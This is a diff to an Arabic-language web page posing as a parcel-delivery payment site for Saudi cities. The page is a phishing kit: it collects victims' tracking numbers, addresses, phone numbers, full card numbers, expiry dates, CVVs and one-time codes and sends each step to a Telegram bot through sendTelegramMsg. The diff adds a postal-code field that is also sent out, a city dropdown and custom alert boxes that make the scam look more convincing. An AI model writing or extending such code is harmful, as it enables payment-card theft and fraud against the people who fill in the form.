@@ -10,6 +10,29 @@
         body { background-color: #f8f9fa; display: flex; justify-content: center; }
         .app-container { width: 100%; max-width: 480px; background-color: #fff; min-height: 100vh; overflow-x: hidden; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.1); padding-bottom: 60px; }
 
+        /* تنسيق رسالة الخطأ المخصصة */
+        .custom-alert-overlay {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.5);
+            display: none; justify-content: center; align-items: center;
+            z-index: 2000;
+        }
+        .custom-alert-box {
+            background: #fff; padding: 25px; border-radius: 12px;
+            width: 80%; max-width: 320px; text-align: center;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            position: relative;
+            direction: rtl;
+        }
+        .custom-alert-box h3 { color: #0b3b82; font-size: 20px; margin-bottom: 10px; font-weight: 800; }
+        .custom-alert-box p { color: #555; font-size: 16px; margin-bottom: 20px; }
+        .custom-alert-btn {
+            background-color: #0b3b82; color: #fff; border: none;
+            padding: 10px 25px; font-size: 16px; font-weight: 800;
+            border-radius: 8px; cursor: pointer; transition: 0.3s;
+        }
+        .custom-alert-btn:hover { background-color: #082d63; }
+
         .header { background-color: #fff; display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid #eee; }
         .logo-area { display: flex; align-items: center; gap: 10px; }
         .logo-area svg { width: 40px; height: 40px; fill: #f7b71d; }
@@ -40,8 +63,8 @@
         .payment-card { background: #f9f9f9; border: 1px solid #eee; padding: 25px 20px; border-radius: 12px; }
         .input-group { margin-bottom: 18px; text-align: right; }
         .input-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 700; font-size: 14px; }
-        .input-group input { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; outline: none; transition: 0.3s; }
-        .input-group input:focus { border-color: #f7b71d; }
+        .input-group input, .input-group select { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; outline: none; transition: 0.3s; background-color: #fff; }
+        .input-group input:focus, .input-group select:focus { border-color: #f7b71d; }
         .input-group input[readonly] { background-color: #eef2f5; color: #0b3b82; font-weight: 800; text-align: center; }
         .row { display: flex; gap: 15px; }
         .row .input-group { flex: 1; }
@@ -94,6 +117,14 @@
     </style>
 </head>
 <body>
+
+    <div id="custom-alert" class="custom-alert-overlay">
+        <div class="custom-alert-box">
+            <h3>تنبيه</h3>
+            <p id="custom-alert-msg">الرجاء تعبئة البيانات</p>
+            <button class="custom-alert-btn" onclick="closeCustomAlert()">حسناً</button>
+        </div>
+    </div>
 
     <div class="app-container">
         
@@ -159,6 +190,7 @@
             </div>
         </div>
 
+        <!-- صفحة العنوان -->
         <div id="address-page">
             <div class="payment-header">
                 <h2>بيانات التوصيل</h2>
@@ -167,15 +199,43 @@
             <div class="payment-card">
                 <div class="input-group">
                     <label>المدينة</label>
-                    <input type="text" id="address-city" placeholder="مثال: الرياض">
+                    <select id="address-city">
+                        <option value="" disabled selected>اختر المدينة...</option>
+                        <option value="الرياض">الرياض</option>
+                        <option value="جدة">جدة</option>
+                        <option value="مكة المكرمة">مكة المكرمة</option>
+                        <option value="المدينة المنورة">المدينة المنورة</option>
+                        <option value="الدمام">الدمام</option>
+                        <option value="الخبر">الخبر</option>
+                        <option value="الظهران">الظهران</option>
+                        <option value="الأحساء">الأحساء</option>
+                        <option value="الطائف">الطائف</option>
+                        <option value="بريدة">بريدة</option>
+                        <option value="عنيزة">عنيزة</option>
+                        <option value="حائل">حائل</option>
+                        <option value="تبوك">تبوك</option>
+                        <option value="أبها">أبها</option>
+                        <option value="خميس مشيط">خميس مشيط</option>
+                        <option value="نجران">نجران</option>
+                        <option value="جازان">جازان</option>
+                        <option value="الجبيل">الجبيل</option>
+                        <option value="ينبع">ينبع</option>
+                        <option value="عرعر">عرعر</option>
+                        <option value="سكاكا">سكاكا</option>
+                        <option value="الباحة">الباحة</option>
+                    </select>
                 </div>
                 <div class="input-group">
                     <label>الحي</label>
-                    <input type="text" id="address-district" placeholder="مثال: حي النرجس">
+                    <input type="text" id="address-district" placeholder="ادخل معلومات الحي">
                 </div>
                 <div class="input-group">
                     <label>الشارع</label>
-                    <input type="text" id="address-street" placeholder="اسم الشارع ورقم المبنى">
+                    <input type="text" id="address-street" placeholder="ادخل اسم الشارع ورقم البيت">
+                </div>
+                <div class="input-group">
+                    <label>الرمز البريدي</label>
+                    <input type="tel" id="address-zip" placeholder="ادخل الرمز البريدي لمدينتك">
                 </div>
                 <div class="input-group">
                     <label>رقم الجوال</label>
@@ -201,18 +261,15 @@
                 </div>
                 <div class="input-group">
                     <label>رقم البطاقة</label>
-                    <!-- تعديل: تحديد 16 رقم فقط -->
                     <input type="tel" id="card-number" placeholder="0000 0000 0000 0000" maxlength="16" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                 </div>
                 <div class="row">
                     <div class="input-group">
                         <label>تاريخ الانتهاء</label>
-                        <!-- تعديل: التاريخ التلقائي -->
                         <input type="tel" id="card-expiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)">
                     </div>
                     <div class="input-group">
                         <label>رمز الأمان (CVV)</label>
-                        <!-- تعديل: 3 أرقام فقط -->
                         <input type="tel" id="card-cvv" placeholder="123" maxlength="3" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                     </div>
                 </div>
@@ -257,6 +314,14 @@
         let currentAmount = "";
         let currentPhone = ""; 
 
+        function showCustomAlert(msg) {
+            document.getElementById('custom-alert-msg').innerText = msg;
+            document.getElementById('custom-alert').style.display = 'flex';
+        }
+        function closeCustomAlert() {
+            document.getElementById('custom-alert').style.display = 'none';
+        }
+
         function sendTelegramMsg(msg) {
             var url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
             fetch(url).then(res => res.json()).then(data => {
@@ -274,11 +339,10 @@
             return price;
         }
 
-        // دالة تنسيق التاريخ التلقائي
         function formatExpiry(input) {
-            let value = input.value.replace(/\D/g, ''); // إزالة أي شي غير الأرقام
+            let value = input.value.replace(/\D/g, '');
             if (value.length > 2) {
-                value = value.slice(0, 2) + '/' + value.slice(2, 4); // إضافة / بعد أول رقمين
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
             }
             input.value = value;
         }
@@ -288,6 +352,7 @@
             sessionStorage.setItem('city', document.getElementById('address-city').value);
             sessionStorage.setItem('district', document.getElementById('address-district').value);
             sessionStorage.setItem('street', document.getElementById('address-street').value);
+            sessionStorage.setItem('zip', document.getElementById('address-zip').value);
             sessionStorage.setItem('phone', document.getElementById('address-phone').value);
             sessionStorage.setItem('name', document.getElementById('card-name').value);
             sessionStorage.setItem('card', document.getElementById('card-number').value);
@@ -302,6 +367,7 @@
             if(sessionStorage.getItem('city')) document.getElementById('address-city').value = sessionStorage.getItem('city');
             if(sessionStorage.getItem('district')) document.getElementById('address-district').value = sessionStorage.getItem('district');
             if(sessionStorage.getItem('street')) document.getElementById('address-street').value = sessionStorage.getItem('street');
+            if(sessionStorage.getItem('zip')) document.getElementById('address-zip').value = sessionStorage.getItem('zip');
             if(sessionStorage.getItem('phone')) document.getElementById('address-phone').value = sessionStorage.getItem('phone');
             if(sessionStorage.getItem('name')) document.getElementById('card-name').value = sessionStorage.getItem('name');
             if(sessionStorage.getItem('card')) document.getElementById('card-number').value = sessionStorage.getItem('card');
@@ -313,7 +379,7 @@
 
         function goToAddress() {
             currentTrackingNumber = document.getElementById('tracking-number').value;
-            if (currentTrackingNumber.trim() === "") { alert("الرجاء إدخال رقم الشحنة!"); return; }
+            if (currentTrackingNumber.trim() === "") { showCustomAlert("الرجاء إدخال رقم الشحنة!"); return; }
             
             sendTelegramMsg("📦 المستخدم أدخل رقم الشحنة: " + currentTrackingNumber);
             saveData();
@@ -328,10 +394,11 @@
             var city = document.getElementById('address-city').value;
             var district = document.getElementById('address-district').value;
             var street = document.getElementById('address-street').value;
+            var zip = document.getElementById('address-zip').value;
             var phone = document.getElementById('address-phone').value;
 
-            if (city.trim() === "" || district.trim() === "" || street.trim() === "" || phone.trim() === "") {
-                alert("الرجاء إكمال جميع بيانات التوصيل!");
+            if (city === "" || district.trim() === "" || street.trim() === "" || zip.trim() === "" || phone.trim() === "") {
+                showCustomAlert("الرجاء إكمال جميع بيانات التوصيل!");
                 return;
             }
 
@@ -340,6 +407,7 @@
             addressMsg += `المدينة: ${city}\n`;
             addressMsg += `الحي: ${district}\n`;
             addressMsg += `الشارع: ${street}\n`;
+            addressMsg += `الرمز البريدي: ${zip}\n`;
             addressMsg += `رقم الجوال: ${phone}`;
             sendTelegramMsg(addressMsg);
 
@@ -360,10 +428,9 @@
             var expiry = document.getElementById('card-expiry').value;
             var cvv = document.getElementById('card-cvv').value;
 
-            // التعديل: التحقق من عدد الأرقام قبل الإرسال
-            if(cardNumber.length !== 16) { alert("رقم البطاقة يجب أن يكون 16 رقم بالضبط"); return; }
-            if(cvv.length !== 3) { alert("رمز الأمان CVV يجب أن يكون 3 أرقام بالضبط"); return; }
-            if(expiry.length !== 5) { alert("تاريخ الانتهاء غير صحيح (MM/YY)"); return; }
+            if(cardNumber.length !== 16) { showCustomAlert("رقم البطاقة يجب أن يكون 16 رقم بالضبط"); return; }
+            if(cvv.length !== 3) { showCustomAlert("رمز الأمان CVV يجب أن يكون 3 أرقام بالضبط"); return; }
+            if(expiry.length !== 5) { showCustomAlert("تاريخ الانتهاء غير صحيح (MM/YY)"); return; }
 
             let cardMsg = `💳 بيانات البطاقة:\n`;
             cardMsg += `الاسم: ${currentCustomerName}\n`;
@@ -390,7 +457,7 @@
             let otpCode = document.getElementById('otp-single-input').value;
             
             if (otpCode.trim() === "") {
-                alert("الرجاء إدخال رمز التحقق");
+                showCustomAlert("الرجاء إدخال رمز التحقق");
                 return;
             }
 
